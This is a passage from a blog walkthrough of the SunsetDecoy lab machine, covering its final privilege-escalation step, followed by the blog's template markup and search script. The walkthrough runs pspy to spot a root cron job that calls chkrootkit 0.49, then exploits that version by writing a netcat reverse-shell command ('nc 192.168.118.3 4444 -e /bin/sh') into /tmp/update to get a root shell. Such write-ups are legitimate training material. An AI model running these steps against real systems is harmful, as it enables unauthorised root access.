+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">192.168.120.164 - - [26/Aug/2020 13:25:01] &quot;GET /pspy64 HTTP/1.1&quot; 200 -</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We will download it onto the target and execute it there:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cd /tmp</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/wget http://192.168.118.3/pspy64</span><br><span class="line">--2020-08-26 13:25:01--  http://192.168.118.3/pspy64</span><br><span class="line">Connecting to 192.168.118.3:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3078592 (2.9M) [application/octet-stream]</span><br><span class="line">Saving to: ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64                      100%[=========================================&gt;]   2.94M  1.06MB/s    in 2.8s</span><br><span class="line"></span><br><span class="line">2020-08-26 13:25:03 (1.06 MB/s) - ‘pspy64’ saved [3078592/3078592]</span><br><span class="line"></span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/chmod +x pspy64</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./pspy64</span><br><span class="line">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒</span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░</span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░</span><br><span class="line">                   ░           ░ ░</span><br><span class="line">                               ░ ░</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>After some more output, <code>PSpy</code> shows us the following:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5285   | /usr/sbin/CRON -f</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5286   | /usr/sbin/CRON -f</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5287   | /bin/sh -c /bin/bash /root/script.sh</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5288   | /bin/bash /root/script.sh</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5291   | /bin/sh /root/chkrootkit-0.49/chkrootkit</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5290   | /bin/sh /root/chkrootkit-0.49/chkrootkit</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5289   | /bin/sh /root/chkrootkit-0.49/chkrootkit</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5292   | /bin/sh /root/chkrootkit-0.49/chkrootkit</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5305   | /bin/sh /root/chkrootkit-0.49/chkrootkit</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5306   | /bin/sh /root/chkrootkit-0.49/chkrootkit</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5307   | /bin/sh /root/chkrootkit-0.49/chkrootkit</span><br><span class="line">2020/08/26 13:26:01 CMD: UID=0    PID=5308   | /bin/sh /root/chkrootkit-0.49/chkrootkit</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Looking up <code>chkrootkit-0.49</code> leads us directly to a local privilege escalation vulnerability in Chkrootkit version 0.49 (<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33899">https://www.exploit-db.com/exploits/33899</a>).</p>
+<h3 id="Local-Privilege-Escalation"><a href="#Local-Privilege-Escalation" class="headerlink" title="Local Privilege Escalation"></a><strong>Local Privilege Escalation</strong></h3><p>First, start a netcat listener:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nc -lvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Following the exploit, we will create a file <strong>/tmp/update</strong> on the target, drop a reverse shell payload into it, give it executable permissions, and then wait for the process to call and execute our payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ echo &quot;/usr/bin/nc 192.168.118.3 4444 -e /bin/sh&quot; &gt; update</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/cat update</span><br><span class="line">/usr/bin/nc 192.168.118.3 4444 -e /bin/sh</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/chmod +x update</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>After waiting up to a minute, the process executes our payload, and we obtain a root shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nc -lvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.120.164: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.118.3] from (UNKNOWN) [192.168.120.164] 56536</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">root@60832e9f188106ec5bcc4eb7709ce592:~# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@60832e9f188106ec5bcc4eb7709ce592:~#</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Cracking-Zip-File/" rel="tag"># Cracking Zip File</a>
+          
+            <a href="/tags/Cracking-Shadow-File/" rel="tag"># Cracking Shadow File</a>
+          
+            <a href="/tags/Chkrootkit-exploit/" rel="tag"># Chkrootkit exploit</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/undefined/Kevin/" rel="next" title="Kevin">
+                <i class="fa fa-chevron-left"></i> Kevin
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/Sevion3.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+               <a href="/archives/">
+	      <!-- <a href="/archives/%7C%7C%20fa-solid%20fa-align-center"> -->
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Sev1on" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-fab fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://discord.gg/8gyzR5Y52X" target="_blank" title="Discord">
+                      
+                        <i class="fa fa-fw fa-fa-solid fa-link"></i>Discord</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://t.me/pay1oad" target="_blank" title="Telegram">
+                      
+                        <i class="fa fa-fw fa-fab fa-telegram"></i>Telegram</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation-Guide-for-SunsetDecoy"><span class="nav-number">1.</span> <span class="nav-text">Exploitation Guide for SunsetDecoy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">1.1.</span> <span class="nav-text">Summary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration"><span class="nav-number">1.2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">1.2.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Enumeration"><span class="nav-number">1.2.2.</span> <span class="nav-text">Web Enumeration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-number">1.3.</span> <span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cracking-Zip-File"><span class="nav-number">1.3.1.</span> <span class="nav-text">Cracking Zip File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cracking-Shadow-File"><span class="nav-number">1.3.2.</span> <span class="nav-text">Cracking Shadow File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH"><span class="nav-number">1.3.3.</span> <span class="nav-text">SSH</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escalation"><span class="nav-number">1.4.</span> <span class="nav-text">Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Local-Enumeration"><span class="nav-number">1.4.1.</span> <span class="nav-text">Local Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PSpy-Process-Monitor"><span class="nav-number">1.4.2.</span> <span class="nav-text">PSpy Process Monitor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Local-Privilege-Escalation"><span class="nav-number">1.4.3.</span> <span class="nav-text">Local Privilege Escalation</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"> </span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+  <div id="site-runtime">
+  <span class="post-meta-item-icon">
+    <i class="fa fa-clock-o"></i>
+  </span>
+  <span id="runtime"></span>
+</div>
+
+<script language="javascript">
+  function isPC() {
+    var userAgentInfo = navigator.userAgent;
+    var agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
+    for (var i = 0; i < agents.length; i++) {
+      if (userAgentInfo.indexOf(agents[i]) > 0) {
+        return false;
+      }
+    }
+    return true;
+  }
+
+  function siteTime(openOnPC, start) {
+    window.setTimeout("siteTime(openOnPC, start)", 1000);
+    var seconds = 1000;
+    var minutes = seconds * 60;
+    var hours = minutes * 60;
+    var days = hours * 24;
+    var years = days * 365;
+      start = new Date("2013-11-23 09:00:00 +0800");
+    var now = new Date();
+    var year = now.getFullYear();
+    var month = now.getMonth() + 1;
+    var date = now.getDate();
+    var hour = now.getHours();
+    var minute = now.getMinutes();
+    var second = now.getSeconds();
+    var diff = now - start;
+
+    var diffYears = Math.floor(diff / years);
+    var diffDays = Math.floor((diff / days) - diffYears * 365);
+    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+
+    if (openOnPC) {
+      document.getElementById("runtime").innerHTML = "Running: " + diffYears + " years " + diffDays + " days " + diffHours + " hours " + diffMinutes + " mins " + diffSeconds + " secs";
+    } else {
+      document.getElementById("runtime").innerHTML = "Running: " + diffYears + "y " + diffDays + "d " + diffHours + "h " + diffMinutes + "m " + diffSeconds + "s";
+    }
+  }
+
+  var showOnMobile = false;
+  var openOnPC = isPC();
+  var start = new Date();
+  siteTime(openOnPC, start);
+
+  if (!openOnPC && !showOnMobile) {
+    document.getElementById('site-runtime').style.display = 'none';
+  }
+</script>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
